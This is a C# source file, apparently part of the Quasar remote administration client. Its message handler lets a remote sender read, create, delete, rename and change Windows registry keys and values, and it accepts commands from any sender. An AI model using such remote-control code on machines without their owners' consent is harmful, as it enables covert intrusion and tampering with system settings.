using Quasar.Client.Extensions;
using Quasar.Client.Helper;
using Quasar.Client.Registry;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using System;

namespace Quasar.Client.Messages
{
    public class RegistryHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoLoadRegistryKey ||
                                                             message is DoCreateRegistryKey ||
                                                             message is DoDeleteRegistryKey ||
                                                             message is DoRenameRegistryKey ||
                                                             message is DoCreateRegistryValue ||
                                                             message is DoDeleteRegistryValue ||
                                                             message is DoRenameRegistryValue ||
                                                             message is DoChangeRegistryValue;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoLoadRegistryKey msg:
                    Execute(sender, msg);
                    break;
                case DoCreateRegistryKey msg:
                    Execute(sender, msg);
                    break;
                case DoDeleteRegistryKey msg:
                    Execute(sender, msg);
                    break;
                case DoRenameRegistryKey msg:
                    Execute(sender, msg);
                    break;
                case DoCreateRegistryValue msg:
                    Execute(sender, msg);
                    break;
                case DoDeleteRegistryValue msg:
                    Execute(sender, msg);
                    break;
                case DoRenameRegistryValue msg:
                    Execute(sender, msg);
                    break;
                case DoChangeRegistryValue msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoLoadRegistryKey message)
        {
            GetRegistryKeysResponse responsePacket = new GetRegistryKeysResponse();
            try
            {
                RegistrySeeker seeker = new RegistrySeeker();
                seeker.BeginSeeking(message.RootKeyName);

                responsePacket.Matches = seeker.Matches;
                responsePacket.IsError = false;
            }
            catch (Exception e)
            {
                responsePacket.IsError = true;
                responsePacket.ErrorMsg = e.Message;
            }
            responsePacket.RootKey = message.RootKeyName;
            client.Send(responsePacket);
        }


        private void Execute(ISender client, DoCreateRegistryKey message)
        {
            GetCreateRegistryKeyResponse responsePacket = new GetCreateRegistryKeyResponse();
            string errorMsg;
            string newKeyName = "";

            try
            {
                responsePacket.IsError = !(RegistryEditor.CreateRegistryKey(message.ParentPath, out newKeyName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }

            responsePacket.ErrorMsg = errorMsg;
            responsePacket.Match = new RegSeekerMatch
            {
                Key = newKeyName,
                Data = RegistryKeyHelper.GetDefaultValues(),
                HasSubKeys = false
            };
            responsePacket.ParentPath = message.ParentPath;

            client.Send(responsePacket);
        }

        private void Execute(ISender client, DoDeleteRegistryKey message)
        {
            GetDeleteRegistryKeyResponse responsePacket = new GetDeleteRegistryKeyResponse();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.DeleteRegistryKey(message.KeyName, message.ParentPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ParentPath = message.ParentPath;
            responsePacket.KeyName = message.KeyName;

            client.Send(responsePacket);
        }

        private void Execute(ISender client, DoRenameRegistryKey message)
        {
            GetRenameRegistryKeyResponse responsePacket = new GetRenameRegistryKeyResponse();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.RenameRegistryKey(message.OldKeyName, message.NewKeyName, message.ParentPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ParentPath = message.ParentPath;
            responsePacket.OldKeyName = message.OldKeyName;
            responsePacket.NewKeyName = message.NewKeyName;

            client.Send(responsePacket);
        }


        private void Execute(ISender client, DoCreateRegistryValue message)
        {
            GetCreateRegistryValueResponse responsePacket = new GetCreateRegistryValueResponse();
            string errorMsg;
            string newKeyName = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.CreateRegistryValue(message.KeyPath, message.Kind, out newKeyName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.Value = RegistryKeyHelper.CreateRegValueData(newKeyName, message.Kind, message.Kind.GetDefault());
            responsePacket.KeyPath = message.KeyPath;

            client.Send(responsePacket);
        }

        private void Execute(ISender client, DoDeleteRegistryValue message)
        {
            GetDeleteRegistryValueResponse responsePacket = new GetDeleteRegistryValueResponse();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.DeleteRegistryValue(message.KeyPath, message.ValueName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ValueName = message.ValueName;
            responsePacket.KeyPath = message.KeyPath;

            client.Send(responsePacket);
        }

        private void Execute(ISender client, DoRenameRegistryValue message)
        {
            GetRenameRegistryValueResponse responsePacket = new GetRenameRegistryValueResponse();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.RenameRegistryValue(message.OldValueName, message.NewValueName, message.KeyPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.KeyPath = message.KeyPath;
            responsePacket.OldValueName = message.OldValueName;
            responsePacket.NewValueName = message.NewValueName;

            client.Send(responsePacket);
        }

        private void Execute(ISender client, DoChangeRegistryValue message)
        {
            GetChangeRegistryValueResponse responsePacket = new GetChangeRegistryValueResponse();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.ChangeRegistryValue(message.Value, message.KeyPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.KeyPath = message.KeyPath;
            responsePacket.Value = message.Value;
            
            client.Send(responsePacket);
        }
    }
}
